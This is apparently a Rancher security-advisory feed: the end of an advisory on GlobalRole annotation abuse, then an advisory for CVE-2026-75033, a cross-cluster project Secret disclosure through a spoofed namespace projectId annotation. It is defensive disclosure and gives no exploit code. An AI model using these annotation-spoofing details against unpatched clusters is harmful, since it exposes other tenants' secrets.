No workaround exists other than upgrading to a patched version. Organizations unable to upgrade immediately can reduce exposure by following these partial mitigations:
- **Restrict permissions:** Audit and limit `create` or `update` permissions on `management.cattle.io/globalroles` to trusted administrators only. - **Audit annotations:** Review `GlobalRole` custom resources for unexpected `authz.management.cattle.io/cr-name` annotations that name `ClusterRole` resources they do not own.
### References
- [GHSA-jwvr / CVE-2021-36784](https://github.com/rancher/rancher/security/advisories/GHSA-jwvr-vv7p-gpwq) - [rancher/rancher #56593](https://github.com/rancher/rancher/pull/56593) - Removes annotation-based logic for determining cluster role and cluster role binding names in GlobalRoles and GlobalRoleBindings
### For more information
If you have any questions or comments about this advisory:
- Reach out to the [SUSE Rancher Security team](https://github.com/rancher/rancher/security/policy) for security related inquiries. - Open an issue in the [Rancher](https://github.com/rancher/rancher/issues/new/choose) repository. - Verify our [support matrix](https://www.suse.com/suse-rancher/support-matrix/all-supported-versions/) and [product support life cycle](https://www.suse.com/lifecycle/).

item.title: [HIGH] rancher/rancher — Cross-cluster Project Secret disclosure via namespace project ID spoofing in Rancher (CVE-2026-75033)
item.description:
CVE-2026-75033 · CVSS 7.7 (CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:C/C:H/I:N/A:N) · CWE-610, CWE-863
Affected: - go/github.com/rancher/rancher >=2.15.0, <2.15.1 (patched: 2.15.1) - go/github.com/rancher/rancher >=2.14.0, <2.14.5 (patched: 2.14.5) - go/github.com/rancher/rancher >=2.13.0, <2.13.9 (patched: 2.13.9) - go/github.com/rancher/rancher >=2.12.0, <2.12.13 (patched: 2.12.13)
---
### Impact A security vulnerability exists in the Rancher project-scoped `secretsController` (`pkg/controllers/managementuser/secret/`). Project Secrets propagate to a namespace based only on the value of the namespace's `field.cattle.io/projectId` annotation, without validating that the referenced project belongs to the same downstream cluster as the namespace..
A separate instance of the controller runs for each downstream cluster managed by a Rancher instance.
